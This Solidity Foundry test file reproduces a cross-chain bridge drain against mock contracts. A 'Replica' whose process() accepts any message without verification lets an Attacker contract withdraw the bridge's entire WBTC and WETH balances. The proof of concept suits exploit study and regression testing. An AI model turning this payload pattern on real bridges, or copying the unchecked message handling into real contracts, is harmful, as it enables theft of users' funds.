// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

interface IReplica {
    function process(bytes memory _message) external returns (bool _success);
}

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;

    constructor(string memory name_, string memory symbol_) {
        name = name_;
        symbol = symbol_;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "insufficient");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract MockERC20Bridge {
    function withdraw(address token, address recipient, uint256 amount) external returns (bool) {
        return MockERC20(token).transfer(recipient, amount);
    }
}

contract MockReplica is IReplica {
    address public immutable bridge;

    constructor(address bridge_) {
        bridge = bridge_;
    }

    function process(bytes memory _message) external override returns (bool _success) {
        (address recipient, address token, uint256 amount) = abi.decode(
            _message,
            (address, address, uint256)
        );
        return MockERC20Bridge(bridge).withdraw(token, recipient, amount);
    }
}

contract Attacker {
    address public immutable replica;
    address public immutable bridge;
    address[] public tokens;

    constructor(address replica_, address bridge_, address[] memory tokens_) {
        replica = replica_;
        bridge = bridge_;
        tokens = tokens_;
    }

    function attack() external {
        for (uint256 i = 0; i < tokens.length; i++) {
            address token = tokens[i];
            uint256 amountBridge = MockERC20(token).balanceOf(bridge);
            bytes memory payload = genPayload(msg.sender, token, amountBridge);
            bool success = IReplica(replica).process(payload);
            require(success, "Failed to process the payload");
        }
    }

    function genPayload(
        address recipient,
        address token,
        uint256 amount
    ) internal pure returns (bytes memory) {
        return abi.encode(recipient, token, amount);
    }
}

contract AttackScenarioTest is Test {
    MockERC20 private wbtc;
    MockERC20 private weth;
    MockERC20Bridge private bridge;
    MockReplica private replica;
    Attacker private attacker;

    address private attackerEOA = address(0xBEEF);

    function setUp() public {
        wbtc = new MockERC20("Wrapped BTC", "WBTC");
        weth = new MockERC20("Wrapped ETH", "WETH");
        bridge = new MockERC20Bridge();
        replica = new MockReplica(address(bridge));

        address[] memory tokens = new address[](2);
        tokens[0] = address(wbtc);
        tokens[1] = address(weth);
        attacker = new Attacker(address(replica), address(bridge), tokens);

        wbtc.mint(address(bridge), 10 ether);
        weth.mint(address(bridge), 25 ether);
    }

    function testAttackDrainsBridgeBalances() public {
        assertEq(wbtc.balanceOf(address(bridge)), 10 ether);
        assertEq(weth.balanceOf(address(bridge)), 25 ether);

        vm.prank(attackerEOA);
        attacker.attack();

        assertEq(wbtc.balanceOf(address(bridge)), 0);
        assertEq(weth.balanceOf(address(bridge)), 0);
        assertEq(wbtc.balanceOf(attackerEOA), 10 ether);
        assertEq(weth.balanceOf(attackerEOA), 25 ether);
    }
}
